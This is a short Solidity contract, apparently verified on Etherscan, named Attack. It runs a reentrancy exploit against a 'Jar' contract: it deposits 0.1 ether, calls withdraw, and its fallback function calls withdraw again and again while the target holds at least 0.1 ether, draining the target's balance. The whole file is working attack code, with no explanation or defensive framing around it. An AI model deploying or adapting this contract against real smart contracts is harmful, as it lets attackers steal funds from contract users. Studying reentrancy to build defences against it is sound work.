/**
 *Submitted for verification at Etherscan.io on 2022-02-22
*/

pragma solidity ^0.8.10;

interface Jar {
    function withdraw() external;
    function deposit() external payable;
}

contract Attack {
    Jar public jar;

    constructor(address jarAddress) {
        jar = Jar(jarAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(jar).balance >= 0.1 ether) {
            jar.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether);
        jar.deposit{value: 0.1 ether}();
        jar.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}